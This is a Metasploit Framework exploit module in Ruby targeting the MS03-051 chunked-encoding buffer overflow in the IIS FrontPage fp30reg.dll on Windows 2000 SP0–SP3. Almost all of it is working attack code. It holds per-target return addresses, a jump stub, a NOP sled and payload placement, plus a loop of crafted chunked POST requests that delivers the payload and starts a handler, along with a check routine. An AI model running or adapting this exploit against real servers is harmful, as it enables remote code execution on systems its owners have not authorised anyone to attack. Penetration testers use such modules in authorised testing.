##
# $Id: ms03_051_fp30reg_chunked.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow',
			'Description'    => %q{
					This is an exploit for the chunked encoding buffer overflow
				described in MS03-051 and originally reported by Brett
				Moore. This particular modules works against versions of
				Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
				issue.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					[ 'CVE', '2003-0822'],
					[ 'OSVDB', '2952'],
					[ 'BID', '9007'],
					[ 'MSB', 'MS03-051'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",
					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP0-SP3',  { 'Ret' => 0x6c38a4d0  }],   # from mfc42.dll
					['Windows 2000 07/22/02', { 'Ret' => 0x67d44eb1  }],   # from fp30reg.dll 07/22/2002
					['Windows 2000 10/06/99', { 'Ret' => 0x67d4665d  }],   # from fp30reg.dll 10/06/1999
				],
			'DisclosureDate' => 'Nov 11 2003',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URL', [ true,  "The path to fp30reg.dll", "/_vti_bin/_vti_aut/fp30reg.dll" ]),
			], self.class)
	end

	def exploit

		print_status("Creating overflow request for fp30reg.dll...")

		pat = rand_text_alphanumeric(0xdead)
		pat[128, 4] = [target.ret].pack('V')
		pat[264, 4] = [target.ret].pack('V')

		# sub eax,0xfffffeff; jmp eax
		pat[160, 7] = "\x2d\xff\xfe\xff\xff" + "\xff\xe0"

		pat[280, 512] = make_nops(512)
		pat[792, payload.encoded.length] = payload.encoded

		0.upto(15) do |i|

			if (i % 3 == 0)
				print_status("Refreshing the remote dllhost.exe process...")

				res = send_request_raw({
					'uri' => datastore['URL']
				}, -1)

				if (res and res.body =~ /specified module could not be found/)
					print_status("The server states that #{datastore['URL']} does not exist.\n")
					return
				end
			end

			print_status("Trying to exploit fp30reg.dll (request #{i} of 15)")

			res = send_request_raw({
				'uri'     => datastore['URL'],
				'method'  => 'POST',
				'headers' =>
				{
					'Transfer-Encoding' => 'Chunked'
				},
				'data'    => "DEAD\r\n#{pat}\r\n0\r\n"
			}, 5)

			if (res and res.body =~ /specified module could not be found/)
				print_status("The server states that #{datastore['URL']} does not exist.\n")
				return
			end

			handler

			select(nil,nil,nil,1)
		end
	end

	def check
		print_status("Requesting the vulnerable ISAPI path...")
		r = send_request_raw({
			'uri' => datastore['URL']
		}, -1)

		if (r and r.code == 501)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

end
